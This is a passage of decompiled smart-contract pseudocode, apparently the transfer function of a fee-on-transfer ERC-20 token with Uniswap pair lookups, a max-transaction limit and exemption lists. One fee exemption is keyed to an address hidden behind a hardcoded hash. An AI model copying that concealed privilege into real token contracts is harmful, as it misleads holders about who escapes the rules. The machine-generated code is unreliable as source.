                                                        staticcall stor10.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor66DE[stor19.length] = arg2
                                                        if arg2 < 0:
                                                            revert with 0, 17
                                                        if balanceOf[0] > -1:
                                                            revert with 0, 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 0, 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[arg1] > !arg2:
                                                            revert with 0, 17
                                                        balanceOf[arg1] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 0, 17
                                                        if not arg2:
                                                            revert with 0, 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor66DE[stor19.length] = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 0, 17
                                                        if balanceOf[0] > !(arg2 * _fee / 100):
                                                            revert with 0, 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 0, 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                                            revert with 0, 17
                                                        balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                        else:
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 16
                                if stor16[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _12218 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(mem[_12218 + 32 len mem[_12218]]):
                                        if arg2 < 0:
                                            revert with 0, 17
                                        if balanceOf[0] > -1:
                                            revert with 0, 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 0, 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[arg1] > !arg2:
                                            revert with 0, 17
                                        balanceOf[arg1] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if this.address == arg1:
                                            if arg2 < 0:
                                                revert with 0, 17
                                            if balanceOf[0] > -1:
                                                revert with 0, 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 0, 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[arg1] > !arg2:
                                                revert with 0, 17
                                            balanceOf[arg1] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor16[address(arg1)]:
                                                if arg2 < 0:
                                                    revert with 0, 17
                                                if balanceOf[0] > -1:
                                                    revert with 0, 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 0, 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[arg1] > !arg2:
                                                    revert with 0, 17
                                                balanceOf[arg1] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor18:
                                                    if arg2 < 0:
                                                        revert with 0, 17
                                                    if balanceOf[0] > -1:
                                                        revert with 0, 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !arg2:
                                                        revert with 0, 17
                                                    balanceOf[arg1] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor66DE[stor19.length] = arg2
                                                        if arg2 < 0:
                                                            revert with 0, 17
                                                        if balanceOf[0] > -1:
                                                            revert with 0, 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 0, 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[arg1] > !arg2:
                                                            revert with 0, 17
                                                        balanceOf[arg1] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 0, 17
                                                        if not arg2:
                                                            revert with 0, 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor66DE[stor19.length] = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 0, 17
                                                        if balanceOf[0] > !(arg2 * _fee / 100):
                                                            revert with 0, 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 0, 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                                            revert with 0, 17
                                                        balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
            else:
                mem[32] = 13
                require arg2 <= balanceOf[address(msg.sender)]
                require ext_code.size(stor10)
                staticcall stor10.factory() with:
                        gas gas_remaining wei
                mem[96] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                require ext_code.size(stor10)
                staticcall stor10.WETH() with:
                        gas gas_remaining wei
                mem[ceil32(return_data.size) + 96] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                mem[(2 * ceil32(return_data.size)) + 100] = this.address
                mem[(2 * ceil32(return_data.size)) + 132] = address(ext_call.return_data[0])
                require ext_code.size(address(ext_call.return_data[0]))
                staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                        gas gas_remaining wei
                       args address(this.address), address(ext_call.return_data[0])
                mem[(2 * ceil32(return_data.size)) + 96] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                mem[64] = (4 * ceil32(return_data.size)) + 96
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                if ext_call.return_data[12 len 20] != msg.sender:
                    require ext_code.size(stor10)
                    staticcall stor10.factory() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(stor10)
                    staticcall stor10.WETH() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(address(ext_call.return_data[0]))
                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(ext_call.return_data[0])
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    if arg1 == ext_call.return_data[12 len 20]:
                        if stor16[address(msg.sender)]:
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if stor16[address(arg1)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(arg1):
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if this.address == arg1:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if stor18:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if not arg2:
                                require arg2 <= _maxTxAmount
                                require ext_code.size(stor10)
                                staticcall stor10.factory() with:
                                        gas gas_remaining wei
                                mem[(8 * ceil32(return_data.size)) + 212] = ext_call.return_data[0]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(10 * ceil32(return_data.size)) + 212] = 0xad5c464800000000000000000000000000000000000000000000000000000000
                                require ext_code.size(stor10)
                                staticcall stor10.WETH() with:
                                        gas gas_remaining wei
                                       args mem[(10 * ceil32(return_data.size)) + 216 len 16 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(12 * ceil32(return_data.size)) + 216] = this.address
                                mem[(12 * ceil32(return_data.size)) + 248] = address(ext_call.return_data[0])
                                require ext_code.size(address(ext_call.return_data[0]))
                                staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                        gas gas_remaining wei
                                       args address(this.address), address(ext_call.return_data[0]), mem[(12 * ceil32(return_data.size)) + 280 len 20 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                if ext_call.return_data[12 len 20] == arg1:
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2,
                                                  mem[(14 * ceil32(return_data.size)) + 244 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  arg1,
                                    return 1, mem[(14 * ceil32(return_data.size)) + 244 len 24 * ceil32(return_data.size)]
                                stor19.length++
                                stor19[stor19.length].field_0 = arg1
                                stor66DE[stor19.length] = arg2
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2,
                                              mem[(14 * ceil32(return_data.size)) + 308 len 24 * ceil32(return_data.size)],
                                              msg.sender,
                                              arg1,
                            else:
                                if arg2 and _fee > -1 / arg2:
                                    revert with 0, 17
                                if not arg2:
                                    revert with 0, 18
                                if arg2 * _fee / arg2 != _fee:
                                    revert with 0, 'SafeMath: multiplication overflow'
                                require arg2 <= _maxTxAmount
                                require ext_code.size(stor10)
                                staticcall stor10.factory() with:
                                        gas gas_remaining wei
                                mem[(8 * ceil32(return_data.size)) + 212] = ext_call.return_data[0]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(10 * ceil32(return_data.size)) + 212] = 0xad5c464800000000000000000000000000000000000000000000000000000000
                                require ext_code.size(stor10)
                                staticcall stor10.WETH() with:
                                        gas gas_remaining wei
                                       args mem[(10 * ceil32(return_data.size)) + 216 len 16 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(12 * ceil32(return_data.size)) + 216] = this.address
                                mem[(12 * ceil32(return_data.size)) + 248] = address(ext_call.return_data[0])
                                require ext_code.size(address(ext_call.return_data[0]))
                                staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                        gas gas_remaining wei
                                       args address(this.address), address(ext_call.return_data[0]), mem[(12 * ceil32(return_data.size)) + 280 len 20 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                if ext_call.return_data[12 len 20] == arg1:
                                    if arg2 < arg2 * _fee / 100:
                                        revert with 0, 17
                                    if balanceOf[0] > !(arg2 * _fee / 100):
                                        revert with 0, 17
                                    balanceOf[0] += arg2 * _fee / 100
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                        revert with 0, 17
                                    balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2 - (arg2 * _fee / 100),
                                                  mem[(14 * ceil32(return_data.size)) + 244 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  arg1,
                                    if arg2 * _fee / 100:
                                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                                      arg2 * _fee / 100,
                                                      mem[(14 * ceil32(return_data.size)) + 244 len 24 * ceil32(return_data.size)],
                                                      msg.sender,
                                                      0,
                                    return 1, mem[(14 * ceil32(return_data.size)) + 244 len 24 * ceil32(return_data.size)]
                                stor19.length++
                                stor19[stor19.length].field_0 = arg1
                                stor66DE[stor19.length] = arg2
                                if arg2 < arg2 * _fee / 100:
                                    revert with 0, 17
                                if balanceOf[0] > !(arg2 * _fee / 100):
                                    revert with 0, 17
                                balanceOf[0] += arg2 * _fee / 100
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                    revert with 0, 17
                                balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2 - (arg2 * _fee / 100),
                                              mem[(14 * ceil32(return_data.size)) + 308 len 24 * ceil32(return_data.size)],
                                              msg.sender,
                                              arg1,
                                if arg2 * _fee / 100:
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2 * _fee / 100,
                                                  mem[(14 * ceil32(return_data.size)) + 308 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  0,
                            return 1, mem[(14 * ceil32(return_data.size)) + 308 len 24 * ceil32(return_data.size)]
                    require ext_code.size(stor10)
                    staticcall stor10.factory() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(stor10)
                    staticcall stor10.WETH() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(address(ext_call.return_data[0]))
                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(ext_call.return_data[0])
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    if stor16[address(msg.sender)]:
                        if arg2 < 0:
                            revert with 0, 17
                        if balanceOf[0] > -1:
                            revert with 0, 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[arg1] > !arg2:
                            revert with 0, 17
                        balanceOf[arg1] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if stor16[address(arg1)]:
                        if arg2 < 0:
                            revert with 0, 17
                        if balanceOf[0] > -1:
                            revert with 0, 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[arg1] > !arg2:
                            revert with 0, 17
                        balanceOf[arg1] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(arg1):
                        if arg2 < 0:
                            revert with 0, 17
                        if balanceOf[0] > -1:
                            revert with 0, 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[arg1] > !arg2:
                            revert with 0, 17
                        balanceOf[arg1] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if this.address == arg1:
                        if arg2 < 0:
                            revert with 0, 17
                        if balanceOf[0] > -1:
                            revert with 0, 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[arg1] > !arg2:
                            revert with 0, 17
                        balanceOf[arg1] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if ext_call.return_data[12 len 20] != msg.sender:
                        if msg.sender == address(ext_call.return_data[0]):
                            if arg2 < 0:
                                revert with 0, 17
                            if balanceOf[0] > -1:
                                revert with 0, 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                    else:
                        if stor16[address(arg1)]:
                            if arg2 < 0:
                                revert with 0, 17
                            if balanceOf[0] > -1:
                                revert with 0, 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                    if stor18:
                        if arg2 < 0:
                            revert with 0, 17
                        if balanceOf[0] > -1:
                            revert with 0, 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[arg1] > !arg2:
                            revert with 0, 17
                        balanceOf[arg1] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if not arg2:
                        require arg2 <= _maxTxAmount
                        require ext_code.size(stor10)
                        staticcall stor10.factory() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(stor10)
                        staticcall stor10.WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        mem[(15 * ceil32(return_data.size)) + 216] = this.address
                        mem[(15 * ceil32(return_data.size)) + 248] = address(ext_call.return_data[0])
                        require ext_code.size(address(ext_call.return_data[0]))
                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(ext_call.return_data[0]), mem[(15 * ceil32(return_data.size)) + 280 len 5 * ceil32(return_data.size)]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        if ext_call.return_data[12 len 20] == arg1:
                            if arg2 < 0:
                                revert with 0, 17
                            if balanceOf[0] > -1:
                                revert with 0, 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2,
                                          mem[(17 * ceil32(return_data.size)) + 244 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          arg1,
                            return 1, mem[(17 * ceil32(return_data.size)) + 244 len 9 * ceil32(return_data.size)]
                        stor19.length++
                        stor19[stor19.length].field_0 = arg1
                        stor66DE[stor19.length] = arg2
                        if arg2 < 0:
                            revert with 0, 17
                        if balanceOf[0] > -1:
                            revert with 0, 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[arg1] > !arg2:
                            revert with 0, 17
                        balanceOf[arg1] += arg2
                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                      arg2,
                                      mem[(17 * ceil32(return_data.size)) + 308 len 9 * ceil32(return_data.size)],
                                      msg.sender,
                                      arg1,
                    else:
                        if arg2 and _fee > -1 / arg2:
                            revert with 0, 17
                        if not arg2:
                            revert with 0, 18
                        if arg2 * _fee / arg2 != _fee:
                            revert with 0, 'SafeMath: multiplication overflow'
                        require arg2 <= _maxTxAmount
                        require ext_code.size(stor10)
                        staticcall stor10.factory() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(stor10)
                        staticcall stor10.WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        mem[(15 * ceil32(return_data.size)) + 216] = this.address
                        mem[(15 * ceil32(return_data.size)) + 248] = address(ext_call.return_data[0])
                        require ext_code.size(address(ext_call.return_data[0]))
                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(ext_call.return_data[0]), mem[(15 * ceil32(return_data.size)) + 280 len 5 * ceil32(return_data.size)]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        if ext_call.return_data[12 len 20] == arg1:
                            if arg2 < arg2 * _fee / 100:
                                revert with 0, 17
                            if balanceOf[0] > !(arg2 * _fee / 100):
                                revert with 0, 17
                            balanceOf[0] += arg2 * _fee / 100
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                revert with 0, 17
                            balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2 - (arg2 * _fee / 100),
                                          mem[(17 * ceil32(return_data.size)) + 244 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          arg1,
                            if arg2 * _fee / 100:
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2 * _fee / 100,
